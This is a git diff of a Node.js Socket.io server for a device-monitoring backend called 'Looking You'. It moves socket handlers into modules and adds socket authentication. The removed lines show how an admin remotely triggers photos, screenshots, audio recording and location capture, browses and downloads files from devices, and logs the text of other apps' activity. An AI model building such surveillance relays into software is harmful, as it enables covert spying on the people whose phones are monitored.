@@ -2,6 +2,7 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const cors = require('cors');
+const path = require('path');
 require('dotenv').config();
 
 const { connectDB } = require('./src/config/database');
@@ -9,25 +10,34 @@ const uploadRoutes = require('./src/routes/upload.routes');
 const historyRoutes = require('./src/routes/history.routes');
 const authRoutes = require('./src/routes/auth.routes');
 const syncRoutes = require('./src/routes/sync.routes');
+const healthRoutes = require('./src/routes/health.routes');
 const authMiddleware = require('./src/middlewares/auth.middleware');
+const socketAuthMiddleware = require('./src/middlewares/socketAuth.middleware');
+const { initCronJobs } = require('./src/services/cron.service');
 
-const path = require('path');
+// Sockets
+const registerDeviceSockets = require('./src/sockets/device.socket');
+const registerMediaSockets = require('./src/sockets/media.socket');
+const registerStreamSockets = require('./src/sockets/stream.socket');
+const registerFileSockets = require('./src/sockets/file.socket');
 
 const app = express();
 const server = http.createServer(app);
+
+const corsOrigin = process.env.CORS_ORIGIN || "*";
 const io = new Server(server, {
   path: '/socket.io/',
   cors: {
-    origin: "*",
+    origin: corsOrigin,
     methods: ["GET", "POST"]
   }
 });
 
-// Share io with other routes
+// Share io with routes
 app.set('socketio', io);
 
 // Middlewares
-app.use(cors());
+app.use(cors({ origin: corsOrigin }));
 app.use(express.json());
 
 // Logger for all requests
@@ -36,152 +46,41 @@ app.use((req, res, next) => {
   next();
 });
 
-app.use('/api/auth', authRoutes); // Auth routes (login/seed)
-app.use('/api/sync', syncRoutes); // Public sync route (device sends id)
-app.use('/upload', uploadRoutes); // Register upload routes
-app.use('/api/history', authMiddleware, historyRoutes); // Protect history routes with JWT
-app.use('/uploads', express.static('uploads')); // Serve uploaded files statically
-app.use(express.static(path.join(__dirname, 'public'))); // Serve assets (CSS/JS)
+// HTTP Routes
+app.use('/api/auth', authRoutes);
+app.use('/api/sync', syncRoutes);
+app.use('/api/health', healthRoutes);
+app.use('/upload', uploadRoutes);
+app.use('/api/history', authMiddleware, historyRoutes);
+app.use('/uploads', express.static('uploads'));
+app.use(express.static(path.join(__dirname, 'public')));
 
-// Admin Dashboard Route
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Login Page Route
 app.get('/login', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-// Add a simple route to verify connectivity
 app.get('/', (req, res) => {
   res.send('🚀 Looking You Backend is ONLINE and READY for Socket connections!');
 });
 
-const Device = require('./src/models/device.model');
-const TrackingLog = require('./src/models/tracking.model');
+// Socket Auth Middleware
+io.use(socketAuthMiddleware);
 
 // Socket.io Connection
 io.on('connection', (socket) => {
-  console.log('🔌 A device/admin connected:', socket.id);
+  console.log(`🔌 Client connected: ${socket.id} (Admin: ${socket.isAdmin})`);
 
-  // Listen for device registration
-  socket.on('register_device', async (data) => {
-    console.log('📱 Device registering:', data);
-    try {
-      // Find or create device in MySQL
-      const [device, created] = await Device.findOrCreate({
-        where: { deviceId: data.deviceId },
-        defaults: { employeeName: data.employeeName || 'Unknown' }
-      });
-      
-      await device.update({ isOnline: true, lastSeen: new Date() });
-      socket.join(data.deviceId);
-      console.log(`✅ Device ${data.deviceId} is now online`);
-    } catch (err) {
-      console.error('❌ Registration Error:', err);
-    }
-  });
-
-  // Listen for location updates
-  socket.on('update_location', async (data) => {
-    console.log('📍 Location Update:', data);
-    try {
-      const device = await Device.findOne({ where: { deviceId: data.deviceId } });
-      if (device) {
-        await TrackingLog.create({
-          deviceId: device.id,
-          latitude: data.latitude,
-          longitude: data.longitude,
-          batteryLevel: data.batteryLevel,
-          isCharging: data.isCharging,
-          logType: 'location'
-        });
-        await device.update({ lastSeen: new Date() });
-      }
-    } catch (err) {
-      console.error('❌ Location Update Error:', err);
-    }
-  });
-
-  socket.on('trigger_photo', (data) => {
-    console.log('📸 Admin requested a photo capture for device:', data.deviceId);
-    io.to(data.deviceId).emit('take_photo', { camera: data.camera || 'front' });
-  });
-
-  socket.on('trigger_screenshot', (data) => {
-    console.log('📸 Admin requested a screenshot capture for device:', data.deviceId);
-    io.to(data.deviceId).emit('take_screenshot');
-  });
-
-  socket.on('toggle_tracking', (data) => {
-    console.log(`📡 Admin requested to ${data.action} tracking for device:`, data.deviceId);
-    io.to(data.deviceId).emit('remote_control', { action: data.action });
-  });
-
-  socket.on('trigger_audio', (data) => {
-    console.log(`🎙️ Admin requested audio recording for device:`, data.deviceId, `Duration: ${data.duration}s`);
-    io.to(data.deviceId).emit('trigger_audio', { duration: data.duration || 30 });
-  });
-
-  socket.on('request_current_location', (data) => {
-    console.log(`📍 Admin requested ONE-TIME location for device:`, data.deviceId);
-    io.to(data.deviceId).emit('get_location_once');
-  });
-
-  // --- File Manager Relays ---
-  socket.on('request_directory', (data) => {
-    console.log(`📁 Admin requested directory listing for:`, data.deviceId, `Path: ${data.path || 'root'}`);
-    io.to(data.deviceId).emit('request_directory', { path: data.path });
-  });
-
-  socket.on('directory_data', (data) => {
-    io.emit('directory_data', data);
-  });
-
-  socket.on('directory_error', (data) => {
-    io.emit('directory_error', data);
-  });
-
-  socket.on('trigger_download_file', (data) => {
-    console.log(`⬇️ Admin requested file upload from:`, data.deviceId, `File: ${data.path}`);
-    io.to(data.deviceId).emit('trigger_download_file', { path: data.path });
-  });
-
-  // Dashboard requests list of online devices
-  socket.on('list_devices', async () => {
-    try {
-      const devices = await Device.findAll({ where: { isOnline: true } });
-      socket.emit('devices_data', devices);
-    } catch (err) {
-      console.error('❌ Error fetching devices:', err);
-    }
-  });
-
-  socket.on('activity_log', async (data) => {
-    console.log(`📥 Activity Log received from ${data.deviceId}:`, data.packageName, "-", data.text.substring(0, 30) + "...");
-    try {
-      const device = await Device.findOne({ where: { deviceId: data.deviceId } });
-      if (device) {
-        await TrackingLog.create({
-          deviceId: device.id,
-          logType: 'activity',
-          data: {
-            packageName: data.packageName,
-            text: data.text,
-            timestamp: data.timestamp
-          }
-        });
-        // Optional: Broadcast to admin if they are online
-        io.emit('activity_update', data);
-      }
-    } catch (err) {
-      console.error('❌ Activity Log Error:', err);
-    }
-  });
+  registerDeviceSockets(io, socket);
+  registerMediaSockets(io, socket);
+  registerStreamSockets(io, socket);
+  registerFileSockets(io, socket);
 
   socket.on('disconnect', () => {
-    console.log('❌ User disconnected');
+    console.log(`❌ Client disconnected: ${socket.id}`);
   });
 });
 
@@ -189,7 +88,8 @@ io.on('connection', (socket) => {
 const PORT = process.env.PORT || 5000;
 
 const start = async () => {
-  await connectDB(); // Connect to MySQL
+  await connectDB();
+  initCronJobs();
   server.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on http://0.0.0.0:${PORT}`);
   });
